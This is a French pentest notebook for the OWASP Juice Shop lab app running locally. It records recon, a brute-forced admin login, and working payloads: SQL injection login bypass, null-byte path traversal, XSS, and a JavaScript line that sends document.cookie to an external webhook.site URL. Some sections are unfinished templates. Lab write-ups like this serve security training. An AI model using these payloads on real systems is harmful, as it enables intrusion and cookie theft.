# Information Gathering

## [09:29] Passive Recon

**FACT:** De prime abord, on peut dresser les constats suivant :

1. Boutique en ligne
   - Avis
     - email visible `admin@juice-sh.op`
   - Visuel produit
   - Stock
2. Barre de recherche
3. Mode connecté
   - Formulaire de connexion
   - Formulaire mot de passe oublié
     - Schéma de mot de passe conseillé
     - taille entre `5-40` obligatoire
     - Question de sécurité
4. Customer feedback

**HYP:** Éléments immédiats à rechercher

1. Boutique certainement vulnérable :
   - Failles XSS au niveau des avis.
   - Exploitation du leak d'email.
   - Tester un path traversal au niveau des images
   - Potentialité SSRF au niveau des stock
2. Regarder côté SQLi
3. Brute-force guidé par les critères de mdp / leak de l'adresse admin.
4. Aucune hypothèse pour le moment.

> [!IMPORTANT]
> Afin de capitaliser sur notre exploration, on effectue une navigation instrumentée à des fins de reconnaissance
> en utilisant Burp.

#### Test: Retour sur les échecs de connexion

**Commande:**

**Observation:** Pas de leak informationnel lors de la tentative de connexion avec des identifiants erronés,
ou un email valide.

**Conclusion:** Invalidé.

#### Test: Connexion au compte admin

**Commande:** Brute-force manuel sur la base de

- l'adresse mail divulguée `admin@juice-sh.op`,
- taille du mot de passe entre 5 et 40 caractères.

**Observation:** 
- Connexion réussie.
- En regardant la requête sur Burp, on constate :

```html
POST /rest/user/login
Content-Type: application/json
```

En conséquence de quoi, le back-end considère un json sérialisé. 
C'est un élément à noter pour un autre test.

**Conclusion:** confirmé

#### Test: Logique du form. de connexion

Les tests précédents nous ont appris qu'il n'y avait pas de mention
spécifique lors d'une saisie invalide d'une part, et que la requête 
envoyée était un POST JSON.

**Commande:** Tentative de connexion avec le couple (`test'`, `pass`)  

**Observation:** `[object Object]`
 
**Conclusion:** Mauvaise gestion de l'input, pas de nettoyage, de règles de saisie.

## [09:40] Complément de reconnaissance passive

**FACT:** Après cette incursion active, on cartographie davantage le site
et ses fonctionnalités :

- Processus de commande
  - Adresse (affichage et ajout d'une nouvelle adresse)
  - Informations de paiement (affichage et ajout d'un nouveau mode de paiement)
  - Après achat :
    - Suivi de la commande `http://127.0.0.1:42000/#/track-result/new?id=5267-710e11152b2743f6`
    - Impression du bon de commande : `http://127.0.0.1:42000/ftp/order_5267-710e11152b2743f6.pdf`
- Page de profil
  - upload image
  - image url
  - changer le pseudo
- Privacy and security

**HYP:** Tous ces éléments augmentent la surface d'attaque, notamment si :

- les endpoints comme `ftp` sont accessibles, et rendus tels quels,
- les id sont livrés, les requêtes db sont proxifiées via notre propre requête,
- si les formulaires d'ajouts contiennent des failles SQLi.
- si l'export de donné est mal contrôlé.

#### Test: Exploitation de `/ftp`

**Commandes:**
1. Accès à l'index
```URL
http://127.0.0.1:42000/ftp/
```
2. Exploration
```URL
http://127.0.0.1:42000/ftp/eastere.gg
```
**Observations:** 
1. Endpoint accessible -> vulnérabilité d'exposition http
manifeste.
2. Certains fichiers, en particulier ceux dont l'extention n'est pas pdf/md, ne sont pas accessibles:
```html
OWASP Juice Shop (Express ^4.17.1)
403 Error: Only .md and .pdf files are allowed!
   at verify (/var/lib/juice-shop/build/routes/fileServer.js:55:18)
   at /var/lib/juice-shop/build/routes/fileServer.js:39:13
   at Layer.handle [as handle_request] (/var/lib/juice-shop/node_modules/express/lib/router/layer.js:95:5)
   at trim_prefix (/var/lib/juice-shop/node_modules/express/lib/router/index.js:328:13)
   at /var/lib/juice-shop/node_modules/express/lib/router/index.js:286:9
   at param (/var/lib/juice-shop/node_modules/express/lib/router/index.js:365:14)
   at param (/var/lib/juice-shop/node_modules/express/lib/router/index.js:376:14)
   at Function.process_params (/var/lib/juice-shop/node_modules/express/lib/router/index.js:421:3)
   at next (/var/lib/juice-shop/node_modules/express/lib/router/index.js:280:10)
   at /var/lib/juice-shop/node_modules/serve-index/index.js:145:39
   at FSReqCallback.oncomplete (node:fs:199:5)
```

**Conclusion:** confirmé

#### Test: Export des données personelles

**Commande:** Logique applicative

**Observation:**

```json
{
  "username": "",
  "email": "admin@juice-sh.op",
  "orders": [
    {
      "orderId": "5267-b7be927806296850",
      "totalPrice": 8.96,
      "products": [
        {
          "quantity": 3,
          "name": "Apple Juice (1000ml)",
          "price": 1.99,
          "total": 5.97,
          "bonus": 0
        },
        {
          "quantity": 1,
          "name": "Orange Juice (1000ml)",
          "price": 2.99,
          "total": 2.99,
          "bonus": 0
        }
      ],
      "bonus": 0,
      "eta": "5"
    },
    {
      "orderId": "5267-6a2a9b58d25bec1c",
      "totalPrice": 26.97,
      "products": [
        {
          "quantity": 3,
          "name": "Eggfruit Juice (500ml)",
          "price": 8.99,
          "total": 26.97,
          "bonus": 3
        }
      ],
      "bonus": 3,
      "eta": "0"
    },
    {
      "orderId": "5267-710e11152b2743f6",
      "totalPrice": 10024.91,
      "products": [
        {
          "quantity": 3,
          "id": 1,
          "name": "Apple Juice (1000ml)",
          "price": 1.99,
          "total": 5.97,
          "bonus": 0
        },
        {
          "quantity": 3,
          "id": 2,
          "name": "Orange Juice (1000ml)",
          "price": 2.99,
          "total": 8.97,
          "bonus": 0
        },
        {
          "quantity": 1,
          "id": 3,
          "name": "Eggfruit Juice (500ml)",
          "price": 8.99,
          "total": 8.99,
          "bonus": 1
        },
        {
          "quantity": 1,
          "id": 41,
          "name": "Juice Shop \"Permafrost\" 2020 Edition",
          "price": 9999.99,
          "total": 9999.99,
          "bonus": 1000
        }
      ],
      "bonus": 1001,
      "eta": "1"
    }
  ],
  "reviews": [
    {
      "message": "One of my favorites!",
      "author": "admin@juice-sh.op",
      "productId": 1,
      "likesCount": 0,
      "likedBy": []
    },
    {
      "message": "I bought it, would buy again. 5/7",
      "author": "admin@juice-sh.op",
      "productId": 3,
      "likesCount": 0,
      "likedBy": []
    }
  ],
  "memories": []
}
```

- Pourquoi donner le `productId` ?

**Conclusion:** incertain, voir en interceptant la requête

## [10:31] Technical Choices Recon

**FACT:** Technologies détectées

1. Frameworks JavaScript
    - Angular : 15.2.10
    - Zone.js : version non précisée
2. Langages / Runtime
    - Node.js : version non précisée
    - TypeScript : version non précisée
3. Bibliothèques JavaScript
    - jQuery : 2.2.4
    - core-js : 3.37.1
4. Frameworks UI / Mobile
    - Onsen UI : version non précisée
5. Fonts
    - Font Awesome : version non précisée
6. CDN / Infrastructure
    - cdnjs : version non précisée
    - Cloudflare : version non précisée

**HYP:** 
- Logique métier partiellement exposée au navigateur -> usage de JSON, REST
- jQuery exploitable : 3 failles XSS dû à cette version ancienne, et vulnérable [CVEs](https://www.cvedetails.com/version/1143105/Jquery-Jquery-2.2.4.html)
**TEST:** Se pencher sur les requêtes avec Burp et ZAP.

#### Test: Détermination des vulnérabilités par fuzzing

**Commande:** Utilisation de Zaproxy

**Observation:**
résultat observé

**Conclusion:** confirmé/infirmé/incertain

# Exploitation

#### Test: Injection SQLi

**Commande:**
````sh
POST /rest/user/login HTTP/1.1␍
Host: 127.0.0.1:42000␍
Content-Length: 47␍
sec-ch-ua-platform: "Linux"␍
Accept-Language: fr-FR,fr;q=0.9␍
Accept: application/json, text/plain, */*␍
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"␍
Content-Type: application/json␍
sec-ch-ua-mobile: ?0␍
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36␍
Origin: http://127.0.0.1:42000␍
Sec-Fetch-Site: same-origin␍
Sec-Fetch-Mode: cors␍
Sec-Fetch-Dest: empty␍
Referer: http://127.0.0.1:42000/␍
Accept-Encoding: gzip, deflate, br␍
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=vLeVxlRzkNb47vKDPMo5Lq8wdzVtvfkDuejdjn6EZm2ygrX19BpaQWOJY3oM␍
Connection: keep-alive␍
␍
{"email":"'or 1=1--","password":"test"}
````

**Observation:**
résultat observé

**Conclusion:** confirmé/infirmé/incertain

#### Test: Force data downloading

**Commande:** On utilise la méthode de byte poisoning et on rajoute l'extention `.md` 

````URL 
http://127.0.0.1:42000/ftp/eastere.gg%2500.md
````

**Observation:**

```md
"Congratulations, you found the easter egg!"
- The incredibly funny developers

...

...

...

Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:

L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==

Good luck, egg hunter!
```

On se doute bien qu'il s'agit d'un encodage base64. Décodé, on découvre un endpoint :
```url
http://127.0.0.1:42000/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
```

**Conclusion:** confirmé

#### Test: Exploitation des endpoints sensibles

**Commande:**
````bash
http://127.0.0.1:42000/#/administration
````

**Observation:** On accède à l'admin

**Conclusion:** confirmé

#### Test: XSS

**Commande:**
````bash
http://127.0.0.1:42000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
````

**Observation:**
résultat observé : on a bien l'alerte.
Dans un cas réel,  pour exfiltrer les données, on utilise un webhook comme suit :

```js
new Image().src =
  "https://webhook.site/71a728a6-ae9c-4576-b49e-cf4431945b1f?c=" +
  encodeURIComponent(document.cookie);
```


**Conclusion:** confirmé/infirmé/incertain

# Post-Exploitation

## Pillaging

---
**Data type:** internal document
**Criticity:** Severe
**Vector:** `http://127.0.0.1:42000/ftp/acquisitions.md` 

```md
# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year.
This will have a significant stock market impact as we will elaborate in
detail in the following paragraph:

Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy
eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam
voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet
clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit
amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam
nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat,
sed diam voluptua. At vero eos et accusam et justo duo dolores et ea
rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem
ipsum dolor sit amet.

Our shareholders will be excited. It's true. No fake news.
```
---
